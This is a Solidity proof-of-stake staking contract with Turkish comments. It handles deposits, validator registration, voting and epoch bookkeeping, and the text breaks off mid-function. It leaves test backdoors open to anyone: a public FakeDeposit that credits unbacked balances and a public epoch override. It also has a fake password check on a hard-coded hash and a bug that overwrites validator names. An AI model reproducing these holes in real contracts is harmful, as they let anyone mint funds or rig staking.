// SPDX-License-Identifier: MIT
pragma solidity >=0.8.7;

import {SafeMath} from "./SafeMath.sol";
import "./Data.sol";

contract ProofOfStake {
    using SafeMath for uint256;

    mapping(uint256 => Epoch) public _epochList; // _epochList[epoch] = Epoch Information

    // epoch -> ( validator_index -> self_stake )
    mapping(uint256 => mapping(uint256 => uint256)) public selfStakesForEpoch; //selfStakesForEpoch[epoch][validator_index] = self-stakes

    // epoch -> ( validator_index -> user_vote)
    mapping(uint256 => mapping(uint256 => uint256)) public userVotesForEpoch; //userVotesForEpoch[epoch][validator_index] = total_user_votes

    // epoch -> ( validator_index -> user_vote + self-stake)
    mapping(uint256 => mapping(uint256 => uint256)) public votingPowerForEpoch; // votingPowerForEpoch[epoch][validator_index] = self-stake + total_user_votes

    // epoch -> ( siralama ->  validator index )
    /**
        Epoch   No      vIndex
        1 =>    1   =   1
                2   =   15
                3   =   8
                ..  =   ..
                37  =   ..
    */

    mapping(uint256 => mapping(uint256 => uint256)) public selectedValidators; // selectedValidators[epoch][order] = validator_index

    User[] private _userList; // _userList[user_index] = User Information
    mapping(address => uint256) private _userIndex; // _userIndex[address] = user_index
    mapping(address => mapping(BalanceTypes => uint256)) private _userBalance; // _userBalance[address][LOCKED/UNLOCKED] = balance

    Validator[] private _validatorList; // _validatorList[validator_index] = Validator Information
    mapping(address => uint256) private _validatorIndex; // _validatorIndex[coinbase] = validator_index
    mapping(address => address) private coinbaseOwners; //  coinbaseOwners[coinbase] = user_address
    mapping(uint256 => ResignBalance) public resignBalances; // resignBalances[validator_index] = ResignBalance Information (release epoch, amount)

    mapping(uint256 => Vote[]) private userVotes; // userVotes[user_index] = VoteInformation
    //UserVotes[] private userVotes; //
    UserDeposit[] private userDeposits;

    mapping(uint256 => Reward[]) userRewards;

    /** Events */
    event Deposited(address indexed user, uint256 amount, uint256 epoch);
    event DotEnoughBalance(uint256 minimum, uint256 balance);
    event FailedEvent(string failText);

    mapping(address => bool) private _blacklistedAccount;

    uint256 private _totalDeposits;
    uint256[] private emptyVotes;

    uint256 private constant _MAXIMUM_VALIDATORS = 18; // 3 Foundation Nodes + 18 Validators
    uint256 private constant _MULTIPLE = 1e12; // Just for TopList (12/15/18)
    uint256 private constant _decimals = 18; // Chain Decimals
    uint256 private constant _BLOCK_TIME = 15; // Chain Blocktime (seconds)
    uint256 private constant _MINIMIM_SELF_STAKE = 10000 ether; // Minimum Self-Stake for Candidates
    uint256 private constant _EPOCHTIME = (24 * 60 * 60) / _BLOCK_TIME; // Epoch time
    uint256 private constant _VOTINGTIME = (23 * 60 * 60) / _BLOCK_TIME; // Voting End time for Next Epoch
    uint256 private constant _FIRST_EPOCH_BLOCK_NUMBER = 100000; // Proof-of-stake starting block number :)
    uint256 private constant _MAXIMUM_EPOCHS_FOR_USER_VOTES = 7; // 7 epochs
    uint256 private constant _MAXIMUM_EPOCH_FOR_VALIDATORS = 30; // 30 epochs
    uint256 private constant _COLLECT_VOTES_MULTIPLIER = 100; // Validators can collect vote up to 100x of their self-stake
    bytes32 passCode =
        0xb2876fa49f910e660fe95d6546d1c6c86c78af46f85672173ad5ab78d8143d9d;

    uint256 private fakeNextEpoch = 0;
    uint256 public initilazedLastEpoch = 0;

    address admin;

    constructor() {
        _userList.push(); // 0-empty
        userDeposits.push(); // 0-empty
        //userVotes.push(); // 0-empty
        _validatorList.push(); // 0-empty
        _setFakeNextEpoch(1);
        admin = msg.sender;
        epochInit();
    }

    modifier NotInBlacklist() {
        require(!_blacklistedAccount[msg.sender], "You are in the blacklist");
        _;
    }

    // Sadece oxo deposit yatırmış ve kaydı olanlar işlem yapabilir
    modifier OnlyStakers() {
        require(_userIndex[msg.sender] > 0, "You are not staker!");
        _;
    }

    // coinbase adresinin sahibi işlem yapabilir
    modifier CoinbaseOwnerCheck(address coinbase) {
        require(
            coinbaseOwners[coinbase] == msg.sender,
            "You are not validator owner!"
        );
        _;
    }

    // Parola gerektiren fonksiyonlar için :) Deneysel
    modifier PassworRequired(string memory _password, bytes32 _hash) {
        require(
            getHash({_text: "password", _anotherText: _password}) == _hash,
            "Password is not correct!"
        );
        _;
    }

    // kilitsiz bakiyesi fonksiyon için yetersiz ise işleme devam etme
    modifier UnlockedBalanceCheck(uint256 amount) {
        require(
            _userBalance[msg.sender][BalanceTypes.UNLOCKED] >= amount,
            "Your unlocked balance is not enough"
        );
        _;
    }

    /** ////////////////////////////////////////////////////////////////////////////////////////////////////////// */
    // Deneme süresinde kullanıcılara deposito yapmasalar bile bakiye eklemek için
    function FakeDeposit(address _who, uint256 _amount) public returns (bool) {
        return _depositMoney(_who, _amount);
    }

    /** ////////////////////////////////////////////////////////////////////////////////////////////////////////// */

    /** Deposit */
    // OXO yatırma
    receive() external payable {
        require(msg.value > 0, "Ho ho ho!");

        // require(!_blacklistedAccount[msg.sender], "You are in the blacklist!");
        _depositMoney(msg.sender, msg.value);
    }

    /** Deposit Money */
    // OXO yattığında (veya sahtesinde) kullanıcıya bakiye ekleme
    function _depositMoney(address _who, uint256 _amount)
        internal
        returns (bool)
    {
        // Sonraki dönem bilgisi
        uint256 epoch = _calculateNextEpoch();

        // Kullanıcı index bilgisini getir
        uint256 uIndex = _userIndex[_who];

        // Eğer kayıtlı kullanıcı değilse kaydet
        if (uIndex == 0) {
            uIndex = _registerUser(_who);
        }

        // Kullanıcı para yatırma işlemlerine kaydı ekle
        userDeposits[uIndex].user_deposits.push(Deposit(_amount, epoch));

        // Sisteme yatırılan paraları artır
        _totalDeposits = _totalDeposits.add(_amount);

        // _userBalance[_who][BalanceTypes.UNLOCKED] = _userBalance[_who][
        //     BalanceTypes.UNLOCKED
        // ].add(_amount);

        // Kullanıcı kilitsiz para miktarını artır
        _changeBalance(_who, BalanceTypes.UNLOCKED, BalanceChange.ADD, _amount);

        // Deposited eventini tetikle
        emit Deposited(_who, _amount, epoch);
        return true;
    }

    // Kullanıcının yatırdığı para kaydını görür
    function getUserDeposits(address who)
        public
        view
        returns (UserDeposit memory)
    {
        // kullanıcı index bilgisini getir
        uint256 uIndex = _userIndex[who];
        // Kullanıcı kayıtlı değilse işlemi durdur
        require(uIndex != 0, "You are not stake holder");
        // Kullanıcı deposits dizisini dön
        return userDeposits[uIndex];
    }

    // Validatör adaylık kaydı (coinbase = node imzalama adresi, commission = oy verenlerin gelirinden alacağı pay ..)
    function registerValidator(
        address coinbase,
        uint256 commission,
        string memory name,
        string memory mail,
        string memory webSite,
        uint256 selfStake
    ) public UnlockedBalanceCheck(selfStake) returns (uint256) {
        // Daha önce kayıtlı bir coinbase mi diye kontrol
        require(
            _validatorIndex[coinbase] == 0,
            "This validator address is already registered!"
        );

        // SelfStake nin mininmum selfstake ve üstü olmasını kontrol
        require(
            selfStake >= _MINIMIM_SELF_STAKE,
            "Self-Stake is not an acceptable amount"
        );

        // // Kullanıcının selfstake yapacak kadar kilitsiz bakiyesi var mı?
        // require(
        //     _userBalance[msg.sender][BalanceTypes.UNLOCKED] >=
        //         _MINIMIM_SELF_STAKE,
        //     "You do not have enough unlocked balances for Self-Stake."
        // );

        // if (
        //     _userBalance[msg.sender][BalanceTypes.UNLOCKED] < _MINIMIM_SELF_STAKE
        // ) {
        //     revert NotEnoughBalance(
        //         _MINIMIM_SELF_STAKE,
        //         _userBalance[msg.sender][BalanceTypes.UNLOCKED]
        //     );
        // }

        // Validator listesine 1 kayıt ekle
        _validatorList.push();

        // Son eklenen kaydın index bilgisini al
        uint256 vIndex = _validatorList.length - 1;

        // Bir sonraki dönemi getir
        uint256 firstEpoch = _calculateNextEpoch();

        // Adaylık bitiş tarihini hesapla
        uint256 finalEpoch = firstEpoch + _MAXIMUM_EPOCH_FOR_VALIDATORS - 1;

        // Validator kaydını index numarasına göre kaydet
        _validatorList[vIndex] = Validator({
            owner: msg.sender,
            coinbase: coinbase,
            commission: commission,
            name: name,
            selfStake: selfStake,
            firstEpoch: firstEpoch,
            finalEpoch: finalEpoch,
            resigned: false,
            expired: false,
            mail: mail,
            webSite: webSite
        });

        // index verisini coinbase adresi ile erişilebilir şekilde kaydet
        _validatorIndex[coinbase] = vIndex;

        // Sahiplik verisini kaydet
        coinbaseOwners[coinbase] = msg.sender;

        // selfstake miktarını kilitle
        _lockMyBalance(selfStake);

        // Adaylık süresi için dönem bilgilerini güncelle
        for (uint256 i = 0; i < _MAXIMUM_EPOCH_FOR_VALIDATORS; i = i + 1) {
            // Dönem başlık bilgisi hiç yoksa dönem bilgisi üret
            if (_epochList[firstEpoch + i].epoch == 0) {
                _epochInitalize(firstEpoch + i);
            }

            // Dönem üst bilgisindeki toplam selfstake miktarını artır
            _epochList[firstEpoch + i].totalSelfStakes = _epochList[
                firstEpoch + i
            ].totalSelfStakes.add(selfStake);

            // Dönem-> (ValidatorIndex->SelfStake) bilgisini kaydet
            selfStakesForEpoch[firstEpoch + i][vIndex] = selfStake;
            votingPowerForEpoch[firstEpoch + i][vIndex] = selfStake;

            // Toplist düzeltme
            _registerVotesForToplist(vIndex, firstEpoch + i);
        }

        // setVote(
        //     coinbase,
        //     selfStake,
        //     _MAXIMUM_EPOCH_FOR_VALIDATORS,
        //     VotingType.SELFSTAKE
        // );

        return vIndex;
    }

    // Validatör isim, mail ve website adresini değiştirebilir
    function editValidatorInfo(
        address coinbase,
        string memory name,
        string memory mail,
        string memory webSite
    ) public CoinbaseOwnerCheck(coinbase) returns (bool) {
        uint256 vIndex = _validatorIndex[coinbase];
        if (bytes(name).length != 0) _validatorList[vIndex].name = name;
        if (bytes(mail).length != 0) _validatorList[vIndex].name = mail;
        if (bytes(webSite).length != 0) _validatorList[vIndex].name = webSite;
        return true;
    }

    // Validatör adaylık bitiş süresi değiştirebilir, aynı zamanda selfstake miktarı da artırılabilir
    function extendValidatorEpochs(
        address coinbase,
        uint256 newFinalEpoch,
        uint256 increaseSelfStake
    )
        public
        CoinbaseOwnerCheck(coinbase)
        UnlockedBalanceCheck(increaseSelfStake)
        returns (bool)
    {
        // validator index bilgisini getir
        uint256 vIndex = _getValidatorIndex(coinbase);

        // Eğer bu validator kaydı geri çekilmişse hata ver
        require(!_validatorList[vIndex].resigned, "You are resigned");

        // Eğer bu validator kaydı geçmişte kalmışsa hata ver
        require(!_validatorList[vIndex].expired, "You are expired");

        // Mevcut selfstake miktarını al
        uint256 selfStake = _validatorList[vIndex].selfStake;

        uint256 newSelfStake = selfStake;

        // // Eğer selfstake miktarı artırılacaksa bunun için yeterli kilitsiz bakiye var mı diye kontrol et
        // require(
        //     _userBalance[msg.sender][BalanceTypes.UNLOCKED] >=
        //         increaseSelfStake,
        //     "You have to deposit for increase"
        // );

        // Validatörün kayıtlı adaylık bitiş dönemini al
        uint256 oldFinalEpoch = _validatorList[vIndex].finalEpoch;

        // Gelecek dönem bilgisini al
        uint256 nextEpoch = _calculateNextEpoch();

        // Eğer validatör adaylık bitiş süresini geçirmişse hata ver
        require(
            oldFinalEpoch >= nextEpoch,
            "You can not extend that coinbase, it is expired"
        );

        // Uzatılacak dönem maximum aday olunabilir dönem sayısını geçiyorsa bunu olabilecek en geç dönem ile değiştir
        if (newFinalEpoch - nextEpoch > _MAXIMUM_EPOCH_FOR_VALIDATORS) {
            newFinalEpoch = nextEpoch + _MAXIMUM_EPOCH_FOR_VALIDATORS - 1;
        }

        // Validatör bilgisinde yeni adaylık bitiş dönemini kaydet
        _validatorList[vIndex].finalEpoch = newFinalEpoch;

        // Eğer selfstake miktarı artırılıyorsa kilitsiz bakiyeden ilgili miktarı kilitli bakiyeye ekle
        if (increaseSelfStake != 0) {
            _lockMyBalance(increaseSelfStake);

            // Yeni selfstake miktarını eksiyle topla ve validatör kaydını değiştir
            newSelfStake = selfStake.add(increaseSelfStake);
            _validatorList[vIndex].selfStake = newSelfStake;
        }

        // Gelecek dönem ve adaylık biteceği yeni dönem arasında döngüye gir
        for (
            uint256 epoch = nextEpoch;
            epoch <= newFinalEpoch;
            epoch = epoch + 1
        ) {
            // if (_epochList[epoch].epoch == 0) {
            //     _epochInitalize(epoch);
            // }

            // Validatörün ilgili dönemdeki selfstake miktarını kaydet (eskisini güncele veya yeni ekle)
            selfStakesForEpoch[epoch][vIndex] = newSelfStake;

            // Zaten aday olduğu dönenmlerde totalSelfStakes e artırılan rakamını ilave et
            if (epoch <= oldFinalEpoch && increaseSelfStake > 0) {
                _epochList[epoch].totalSelfStakes = _epochList[epoch]
                    .totalSelfStakes
                    .add(increaseSelfStake);

                votingPowerForEpoch[epoch][vIndex] =
                    votingPowerForEpoch[epoch][vIndex] +
                    increaseSelfStake;
            }

            // Daha önceden aday olmadığı dönemler için toplam selfstake miktarını kaydet
            if (epoch > oldFinalEpoch) {
                _epochList[epoch].totalSelfStakes = _epochList[epoch]
                    .totalSelfStakes
                    .add(newSelfStake);

                votingPowerForEpoch[epoch][vIndex] = newSelfStake;
            }

            _registerVotesForToplist(vIndex, epoch);
        }

        return true;
    }

    // Validatörlüğe newFinalEpoch döneminde veda ediyor
    function resignCandidate(address coinbase, uint256 newFinalEpoch)
        public
        CoinbaseOwnerCheck(coinbase)
        returns (bool)
    {
        // Sonraki dönem bilgisi
        uint256 nextEpoch = _calculateNextEpoch();

        // Sonraki 7 dönem geçtiğinde ayrılabilir. Daha erken ayrılamaz.
        require(
            newFinalEpoch >= nextEpoch + 7,
            "You can not resign before next 7 epochs"
        );

        // Validator sırasını Getir
        uint256 vIndex = _getValidatorIndex(coinbase);

        // Zaten ayrılmış :)
        require(
            resignBalances[vIndex].releaseEpoch == 0,
            "You already resigned"
        );

        //  Validatörün zaten kayıtlı son adaylık bitiş dönemini oku
        uint256 oldFinalEpoch = _validatorList[vIndex].finalEpoch;

        // adaylık bitiş döneminden daha sonraki bir dönem ayrılmak istiyorsa (salaksa)
        if (newFinalEpoch > oldFinalEpoch) {
            revert("You do not need to resign");
        }

        // Validatorün adaylık bitiş dönemini değiştir
        _validatorList[vIndex].finalEpoch = newFinalEpoch;

        // Yeni bitiş döneminden bir dönem sonra eski bitiş dönemine kadar selfstake kayıtlarını sil/çıkar
        for (
            uint256 epoch = oldFinalEpoch + 1;
            epoch <= newFinalEpoch;
            epoch++
        ) {
            // selfstake kaydını al
            uint256 selfStake = selfStakesForEpoch[epoch][vIndex];
            // dönem bilgisinden totalSelfStakes i azalt
            _epochList[epoch].totalSelfStakes = _epochList[epoch]
                .totalSelfStakes
                .sub(selfStake);

            //votingPowerForEpoch[epoch][vIndex] = votingPowerForEpoch[epoch][vIndex].sub(selfStake);

            // selfstake, uservotes ve votingpower kaydını sıfırla
            userVotesForEpoch[epoch][vIndex] = 0;
            selfStakesForEpoch[epoch][vIndex] = 0;
            votingPowerForEpoch[epoch][vIndex] = 0;

            // Toplist güncellemesi
            _registerVotesForToplist(vIndex, epoch);
        }

        // yeni adaylık bitiş döneminden 1 dönem sonra sonra parasını alsın kaydı
        resignBalances[vIndex] = ResignBalance(
            newFinalEpoch.add(1),
            _validatorList[vIndex].selfStake
        );

        // Validator bilgisi resigned olarak işaretle
        _validatorList[vIndex].resigned = true;

        return true;
    }

    // Adaylıktan çekilmiş olan Validatör daha önceden kaydedilen hedef dönem geldiğinde kilitli bakiyesindeki parayı kilitsiz bakiyeye aktarabilir
    function unlockSelfStakeAfterResigned(address coinbase)
        public
        CoinbaseOwnerCheck(coinbase)
        returns (bool)
    {
        // Validatör index bilgisini getir
        uint256 vIndex = _getValidatorIndex(coinbase);

        // if (_validatorList[vIndex].owner != msg.sender) {
        //     revert("You are not owner of that validator");
        // }

        // Bu validatör adaylıktan mı çekilmiş?
        require(_validatorList[vIndex].resigned, "You are not resigned");

        // Bir sonraki dönem bilgisini getir
        uint256 nextEpoch = _calculateNextEpoch(); // next epoch

        // Eğer ilgili kayıt varsa ve hedef serbest bırakma zamanı gelecek dönemden önce ise ve kilitli bakiyesi de varsa :)
        if (
            resignBalances[vIndex].releaseEpoch != 0 &&
            resignBalances[vIndex].releaseEpoch < nextEpoch &&
            _userBalance[msg.sender][BalanceTypes.LOCKED] > 0
        ) {
            // adaylıktan çekilirken ileride çözülmesi için kaydedilen bakiye miktarını al ve kilitli bakiyeden çıkarıp kilitsiz bakiyeye aktar
            uint256 lockedSelfStake = resignBalances[vIndex].amount;

            // kilitli rakamı kilitsiz bakiyeye aktar
            _unLockMyBalance(lockedSelfStake);

            // bu adaylıktan çekilmeye ait self-stake serbest bırakma kaydını sil
            delete resignBalances[vIndex];
        }

        return true;
    }

    // Adaylık dönemi bitmiş, kendisi adaylıktan çekilmemiş validatör için kilitli bakiyesini almasını sağlar (7 dönem sonra)
    function unlockSelfStakeAfterExpired(address coinbase)
        public
        CoinbaseOwnerCheck(coinbase)
        returns (bool)
    {
        // Validatör index bilgisini getir
        uint256 vIndex = _getValidatorIndex(coinbase);

        // Bu validatör expired olduktan sonra kilitli bakiyesini  geri almış mı?
        require(
            !_validatorList[vIndex].expired,
            "You already take your selfstake"
        );

        // Bir sonraki dönem bilgisini getir
        uint256 nextEpoch = _calculateNextEpoch(); // next epoch

        // Adaylık bitiş tarihi gelecek dönem veya sonrasını gösteriyorsa expired olmamıştır
        if (_validatorList[vIndex].finalEpoch >= nextEpoch) {
            revert("You are not expired");
        }

        // Eğer validator adaylık süresi bitiminden 1 dönem geçmemişse hata dön
        // Kendi kendine adaylığı bitmişse sonraki dönem içinde işleme devam edebilir
        if (_validatorList[vIndex].finalEpoch + 1 < nextEpoch) {
            revert("You have to wait 1 epoch after expired");
        }

        // İmkansız ama kullanıcı kilitli bakiyesi ile bu validatör kaydı için kilitlediği selfstakeden azsa hata dön
        if (
            _userBalance[msg.sender][BalanceTypes.LOCKED] <
            _validatorList[vIndex].selfStake
        ) {
            revert("Houston! We have a problem...");
        }

        // kilitli bakiyedeki validatörün son selfstake miktarını kilitsiz bakiyeye taşı
        _unLockMyBalance(_validatorList[vIndex].selfStake);

        // validatör expired kaydının true olarak değiştir
        _validatorList[vIndex].expired = true;

        return true;
    }

    function getMyUnlockedBalance() public view returns (uint256) {
        require(_userIndex[msg.sender] > 0, "You are not stake holder");
        return _userBalance[msg.sender][BalanceTypes.UNLOCKED];
    }

    function getMyLockedBalance() public view returns (uint256) {
        require(_userIndex[msg.sender] > 0, "You are not stake holder");
        return _userBalance[msg.sender][BalanceTypes.LOCKED];
    }

    // Validator kayıtlı ise index bilgisini getir (0-kayıtsız)
    function _getValidatorIndex(address coinbase)
        internal
        view
        returns (uint256)
    {
        return _validatorIndex[coinbase];
    }

    // public version
    function getValidatorIndex(address coinbase) public view returns (uint256) {
        return _validatorIndex[coinbase];
    }

    // index ile validator adayı bilgisini getirir
    function getValidatorByIndex(uint256 index)
        public
        view
        returns (Validator memory)
    {
        return _validatorList[index];
    }

    /// TEST PURPOSE
    function registerMe() public returns (uint256) {
        uint256 uIndex = _registerUser(msg.sender);
        return uIndex;
    }

    ///

    // / New User Record
    function _registerUser(address _user) internal returns (uint256) {
        // Get user_index
        uint256 uIndex = _userIndex[_user];

        // Eğer kullanıcı daha önce kayıtlı değilse
        if (uIndex == 0) {
            _userList.push(); // Listeye bir kayıt ekle
            userDeposits.push(); // User Depositler listesine bir kayıt ekle
            //userVotes.push();

            uIndex = _userList.length - 1; // userlist son kayıt index i bul
            _userList[uIndex] = User({
                user: _user,
                totalRewards: 0,
                totalRewardsFromUserVotes: 0,
                totalRewardsFromCommissions: 0,
                totalRewardsFromSelfStakes: 0
            }); // Kullanıcıyı index e göre kaydet

            userDeposits[uIndex].user = _user; // userDeposits için kullanıcı kaydet
            //userVotes[uIndex].user = _user;

            _userIndex[_user] = uIndex; // user_index i kaydet (address to index)

            _userBalance[_user][BalanceTypes.UNLOCKED] = 0; // Kilitsiz bakiyeyi 0 yap
            _userBalance[_user][BalanceTypes.LOCKED] = 0; // Kilitli bakiyeyi 0 yap
        }

        return uIndex; // user_index
    }

    function setVote(
        address coinbase,
        uint256 amount,
        uint256 maximumEpoch
    ) public OnlyStakers UnlockedBalanceCheck(amount) returns (bool) {
        // ^ Kullanıcı kaydı ve serbest bakiye kontrolü mofidier ile yapıldı

        // Validator listesi için index getir
        uint256 vIndex = _validatorIndex[coinbase];
        // Validator var mı kontrolü
        require(vIndex != 0, "Validator is not available");

        // Validator bilgisini al
        Validator memory v = _validatorList[vIndex];

        // Validator resigned veya expired olmuş mu diye kontroller
        require(!v.expired, "Expired Validator");
        require(!v.resigned, "Resigned Validator");

        // Sonraki dönemi bul
        uint256 nextEpoch = _calculateNextEpoch();

        // Oy gücü verilen oy kadar
        uint256 votingPower = amount;

        // Validatörün gelecek dönem alabileceği max oy miktarını getir (x100 olayı)
        uint256 maxVotingPower = (selfStakesForEpoch[nextEpoch][vIndex] *
            _COLLECT_VOTES_MULTIPLIER) - userVotesForEpoch[nextEpoch][vIndex];

        // Eğer verilen oy fazla ise max olabilecek oy olarak değiştir
        if (amount > maxVotingPower) votingPower = maxVotingPower;

        // Maksimum oy verilen dönem sayısını kontrol et, izin verilen maksimumu geçmesin
        if (
            maximumEpoch == 0 || maximumEpoch > _MAXIMUM_EPOCHS_FOR_USER_VOTES
        ) {
            maximumEpoch = _MAXIMUM_EPOCHS_FOR_USER_VOTES;
        }

        // Validatörün adaylık bitişi oy verme süresinden kısaysa o döneme göre oy için max dönemi değiştir
        if (nextEpoch - 1 + maximumEpoch > v.finalEpoch) {
            maximumEpoch = v.finalEpoch - nextEpoch;
        }

        // user index i getir
        uint256 uIndex = _userIndex[msg.sender];

        //  oy için son dönemi hesapla
        uint256 endEpoch = nextEpoch - 1 + maximumEpoch;

        //uint256 userVoteIndex = userVotes[uIndex].length;

        // Kullanıcı oylarına yeni oy kaydını ekle
        userVotes[uIndex].push(
            Vote({
                user: msg.sender,
                validator: coinbase,
                startEpoch: nextEpoch,
                endEpoch: endEpoch,
                active: true,
                amount: votingPower,
                reward: 0,
                claimed: false
            })
        );

        // oy verilen ilk (next epoch) dönemden ve son döneme kadar döngü
        for (uint256 epoch = nextEpoch; epoch <= endEpoch; epoch++) {
            // Epoch header bilgisi olarak toplam kullanıcı oylarının toplamını artır
            _epochList[epoch].totalUserStakes = _epochList[epoch]
                .totalUserStakes
                .add(votingPower);

            // Epoch için ilgili validatore ait toplam kullanıcı oyunu artır
            userVotesForEpoch[epoch][vIndex] = userVotesForEpoch[epoch][vIndex]
                .add(votingPower);

            // toplist düzenleme fonksiyonunu tetikle
            _registerVotesForToplist(vIndex, epoch);
        }

        // gerçekleşen Oy miktarına göre kullanıcı bakiyesinden kilitlene yap
        _lockMyBalance(votingPower);

        return true;
    }

    function getUserVotes(address _user) public view returns (Vote[] memory) {
        uint256 uIndex = _userIndex[_user];
        Vote[] memory uVotes = new Vote[](userVotes[uIndex].length);
        for (uint256 i = 0; i < userVotes[uIndex].length; i++) {
            // if (userVotes[uIndex][i].claimed == false) {

            // }
            uVotes[i] = userVotes[uIndex][i];
        }
        return uVotes;
    }

    function _registerVotesForToplist(uint256 vIndex, uint256 epoch)
        internal
        returns (bool)
    {
        uint256 totalVotes = (_epochList[epoch].totalSelfStakes +
            _epochList[epoch].totalUserStakes);

        if (epoch > initilazedLastEpoch) return false;

        uint256 newVotingNumber = (totalVotes * _MULTIPLE) + vIndex;
        uint256 listedId = checkValidatorOnList(vIndex, epoch);

        if (listedId < _MAXIMUM_VALIDATORS + 1) {
            if (newVotingNumber == vIndex) newVotingNumber = 0; // Validator resigned :)
            _epochList[epoch].voteX[listedId] = newVotingNumber;
            return true;
        } else {
            uint256 minimum = getMinimumVotes(epoch);
            if (totalVotes > ((minimum - (minimum % _MULTIPLE)) / _MULTIPLE)) {
                for (uint256 i = 0; i < _epochList[epoch].voteX.length; i++) {
                    if (_epochList[epoch].voteX[i] == minimum) {
                        _epochList[epoch].voteX[i] = newVotingNumber;
                        return true;
                    }
                }
            }
        }
        return false;
    }

    function getMinimumVotes(uint256 epoch) internal view returns (uint256) {
        uint256 min = type(uint256).max;
        if (_epochList[epoch].voteX.length == 0) return 0;
        for (uint256 i = 0; i < _epochList[epoch].voteX.length; i++) {
            if (
                _epochList[epoch].voteX[i] < min &&
                _epochList[epoch].voteX[i] != 0
            ) {
                min = _epochList[epoch].voteX[i];
            }
        }
        return min;
    }

    function checkValidatorOnList(uint256 vIndex, uint256 epoch)
        internal
        view
        returns (uint256)
    {
        uint256 index = _MAXIMUM_VALIDATORS + 1;
        for (uint256 i = 0; i < _epochList[epoch].voteX.length; i++) {
            if (_epochList[epoch].voteX[i] == 0) return i;
            if (_epochList[epoch].voteX[i] % _MULTIPLE == vIndex) return i;
        }
        return index;
    }

    function GetValidatorList(uint256 epoch)
        public
        view
        returns (ValidatorSummary[] memory)
    {
        ValidatorSummary[] memory v = new ValidatorSummary[](
            _epochList[epoch].voteX.length
        );
        uint256 index;
        uint256 oy;
        for (uint256 i = 0; i < _epochList[epoch].voteX.length; i++) {
            index = _epochList[epoch].voteX[i] % _MULTIPLE;
            oy = (_epochList[epoch].voteX[i] - index) / _MULTIPLE;
            v[i] = ValidatorSummary({vIndex: index, totalVotes: oy});
        }
        return v;
    }

    function _lockMyBalance(uint256 amount) internal returns (bool) {
        require(
            _userBalance[msg.sender][BalanceTypes.UNLOCKED] >= amount,
            "Unlocked Balance is not enough"
        );
        _changeBalance(
            msg.sender,
            BalanceTypes.UNLOCKED,
            BalanceChange.SUB,
            amount
        );
        _changeBalance(
            msg.sender,
            BalanceTypes.LOCKED,
            BalanceChange.ADD,
            amount
        );
        return true;
    }

    function _unLockMyBalance(uint256 amount) internal returns (bool) {
        require(
            _userBalance[msg.sender][BalanceTypes.LOCKED] >= amount,
            "Locked Balance is not enough"
        );
        _changeBalance(
            msg.sender,
            BalanceTypes.LOCKED,
            BalanceChange.SUB,
            amount
        );
        _changeBalance(
            msg.sender,
            BalanceTypes.UNLOCKED,
            BalanceChange.ADD,
            amount
        );
        return true;
    }

    function _changeBalance(
        address who,
        BalanceTypes balanceType,
        BalanceChange change,
        uint256 amount
    ) internal returns (bool) {
        if (change == BalanceChange.ADD) {
            _userBalance[who][balanceType] = _userBalance[who][balanceType].add(
                amount
            );
        }

        if (change == BalanceChange.SUB) {
            {
                _userBalance[who][balanceType] = _userBalance[who][balanceType]
                    .sub(amount);
            }
        }
        return true;
    }

    function _setFakeNextEpoch(uint256 epoch) public returns (bool) {
        fakeNextEpoch = epoch;
        return true;
    }

    function _calculateNextEpoch() public view returns (uint256) {
        if (fakeNextEpoch != 0) {
            return fakeNextEpoch;
        }

        uint256 blockNumber = block.number - _FIRST_EPOCH_BLOCK_NUMBER; // 125334
        uint256 checkBlockNumber = blockNumber % _EPOCHTIME; // 4374
        uint256 nextEpoch = ((blockNumber - checkBlockNumber) / _EPOCHTIME) + 1;

        // ((125334-4374)/5760)+1 = 22
        // 5520..5760
        if (checkBlockNumber >= _VOTINGTIME) {
            nextEpoch = nextEpoch + 1;
        }

        // 22 = 126720 to 132480
        return nextEpoch;
    }

    function getValidatorList(
        uint256 _page,
        uint256 _resultsPerPage,
        string memory _passText
    )
        public
        view
        PassworRequired(_passText, passCode)
        returns (uint256 count, Validator[] memory validators)
    {
        require(_resultsPerPage <= 20, "Maximum 20 Validators per Page");
        uint256 _vlIndex = _resultsPerPage * _page - _resultsPerPage + 1;

        Validator memory emptyValidatorInfo = Validator({
            owner: address(0),
            coinbase: address(0),
            commission: 0,
            name: "",
            selfStake: 0,
            firstEpoch: 0,
            finalEpoch: 0,
            resigned: false,
            expired: false,
            mail: "",
            webSite: ""
        });

        if (_validatorList.length == 1 || _vlIndex > _validatorList.length) {
            Validator[] memory _emptyReturn = new Validator[](1);
            _emptyReturn[0] = emptyValidatorInfo;
            return (0, _emptyReturn);
        }

        Validator[] memory _vlReturn = new Validator[](_resultsPerPage);

        uint256 _returnCounter = 0;
        for (_vlIndex; _vlIndex < _resultsPerPage * _page; _vlIndex++) {
            if (_vlIndex < _validatorList.length) {
                _vlReturn[_returnCounter] = _validatorList[_vlIndex];
            } else {
                _vlReturn[_returnCounter] = emptyValidatorInfo;
            }
            _returnCounter++;
        }
        return (count = _validatorList.length - 1, validators = _vlReturn);
    }

    function getUserList(
        uint256 _page,
        uint256 _resultsPerPage,
        string memory _passText
    )
        public
        view
        PassworRequired(_passText, passCode)
        returns (uint256 count, SummaryOfUser[] memory list)
    {
        require(_resultsPerPage <= 20, "Maximum 20 Users per Page");
        uint256 _ulIndex = _resultsPerPage * _page - _resultsPerPage + 1;

        SummaryOfUser memory emptyUserInfo = SummaryOfUser({
            index: 0,
            user: address(0),
            totalRewards: 0,
            lockedBalance: 0,
            unlockedBalance: 0
        });

        if (_userList.length == 1 || _ulIndex > _userList.length) {
            SummaryOfUser[] memory _emptyReturn = new SummaryOfUser[](1);
            _emptyReturn[0] = emptyUserInfo;
            return (0, _emptyReturn);
        }

        SummaryOfUser[] memory _ulReturn = new SummaryOfUser[](_resultsPerPage);
        uint256 _returnCounter = 0;
        for (_ulIndex; _ulIndex < _resultsPerPage * _page; _ulIndex++) {
            if (_ulIndex < _userList.length) {
                _ulReturn[_returnCounter] = SummaryOfUser({
                    index: _ulIndex,
                    user: _userList[_ulIndex].user,
                    totalRewards: _userList[_ulIndex].totalRewards,
                    lockedBalance: _userBalance[_userList[_ulIndex].user][
                        BalanceTypes.LOCKED
                    ],
                    unlockedBalance: _userBalance[_userList[_ulIndex].user][
                        BalanceTypes.UNLOCKED
                    ]
                });
            } else {
                _ulReturn[_returnCounter] = emptyUserInfo;
            }
            _returnCounter++;
        }
        return (count = _userList.length - 1, list = _ulReturn);
    }

    // / Epoch Initalize --- _MAXIMUM_EPOCH_FOR_VALIDATORS+7 epoch
    // / Anyone Call
    function epochInit() public returns (uint256, uint256) {
        uint256 beforeInitilazedLastEpoch = initilazedLastEpoch;
